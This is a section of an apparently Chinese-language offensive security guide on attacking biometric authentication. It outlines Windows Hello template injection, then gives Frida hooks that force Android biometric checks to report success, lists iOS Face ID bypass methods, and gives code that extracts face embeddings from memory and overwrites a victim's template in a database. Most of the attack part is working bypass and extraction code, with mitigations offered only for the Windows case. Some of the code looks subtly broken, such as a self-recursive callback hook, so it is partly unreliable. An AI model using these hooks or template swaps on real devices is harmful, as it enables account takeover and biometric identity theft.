## 12. 生物特征模板注入攻击

### 12.1 Windows Hello "Faceplant" — 生物特征模板劫持

> 2026年Black Hat: ERNW研究员演示了"Faceplant"攻击，
> 本地管理员可将攻击者面部注入Windows Biometric Service (WBS)数据库，
> 使系统接受攻击者面部作为任意已注册用户。

```powershell
# === Windows Hello 生物特征模板注入原理 ===
# Windows Biometric Service (WBS) 将面部特征模板存储在:
# C:\Windows\System32\WinBioDatabase\
# 模板以加密形式存储，但本地管理员可解密

# 攻击步骤:
# 1. 获取SYSTEM权限
# 2. 提取目标用户的生物特征数据库
# 3. 注入攻击者面部模板到目标用户数据库
# 4. 攻击者面部被接受为合法用户

# 检测: 监控WinBioDatabase目录的异常写入
# 缓解: 启用Windows Hello Enhanced Sign-in Security (ESS)
#       使用TPM 2.0保护生物特征模板
#       限制本地管理员权限
```

### 12.2 移动端生物特征验证绕过

```javascript
// === Android BiometricPrompt Hook绕过 ===
// CVE-2026-56294: Capacitor Native Biometric — 
// onAuthenticationSucceeded未验证CryptoObject

Java.perform(function() {
    // Hook Android BiometricPrompt.AuthenticationCallback
    var BiometricPrompt = Java.use("androidx.biometric.BiometricPrompt");
    var AuthenticationCallback = Java.use("androidx.biometric.BiometricPrompt$AuthenticationCallback");
    
    AuthenticationCallback.onAuthenticationSucceeded.implementation = function(result) {
        console.log("[*] Biometric authentication SUCCESS — bypassing");
        // 即使指纹/面部不匹配也返回成功
        // 注意: 如果使用CryptoObject，需要额外绕过
        var cryptoObj = Java.use("androidx.biometric.BiometricPrompt$CryptoObject");
        // 构造假的CryptoObject
        this.onAuthenticationSucceeded(
            cryptoObj.$new(null)  // 空CryptoObject绕过加密验证
        );
    };
    
    // Hook BiometricManager.canAuthenticate() 强制返回成功
    var BiometricManager = Java.use("android.hardware.biometrics.BiometricManager");
    BiometricManager.canAuthenticate.implementation = function() {
        console.log("[*] BiometricManager.canAuthenticate → BIOMETRIC_SUCCESS");
        return 0; // BIOMETRIC_SUCCESS
    };
});

// === iOS Face ID绕过 ===
// 方法1: 修改越狱设备的LocalAuthentication框架
// 方法2: Frida Hook LAContext.evaluatePolicy
// 方法3: 替换生物特征数据库中的模板

// Objection绕过示例:
// ios biometic bypass
```

### 12.3 生物特征模板提取与重放

```python
# === 生物特征模板攻击 ===

# 1. 从内存中提取人脸特征向量
# 活体检测SDK在内存中生成人脸特征向量(embedding)
# 通过Frida提取特征向量后可重放

import frida

js_code = """
// Hook Face Recognition SDK
var FaceSDK = Module.findExportByName(null, "face_extract_feature");
if (FaceSDK) {
    Interceptor.attach(FaceSDK, {
        onLeave: function(retval) {
            // 特征向量通常为512维浮点数组
            var featurePtr = this.context.x0;  // ARM64返回特征向量指针
            var features = [];
            for (var i = 0; i < 512; i++) {
                features.push(Memory.readFloat(featurePtr.add(i * 4)));
            }
            console.log("[*] Extracted face embedding: " + JSON.stringify(features));
            // 保存特征向量用于重放攻击
        }
    });
}
"""

# 2. 特征向量重放攻击
# 如果SDK允许通过API直接传入特征向量进行比对
# 攻击者可以绕过活体检测，直接提交目标用户的特征向量

# 3. 数据库攻击
# 某些系统将生物特征模板以明文存储
# 攻击者可以替换数据库中的模板
import sqlite3

def replace_biometric_template(db_path, victim_id, attacker_embedding):
    """替换数据库中的生物特征模板"""
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    # 将攻击者特征向量替换为目标用户的
    cursor.execute(
        "UPDATE biometric_templates SET embedding = ? WHERE user_id = ?",
        (attacker_embedding.tobytes(), victim_id)
    )
    conn.commit()
    conn.close()
```

---

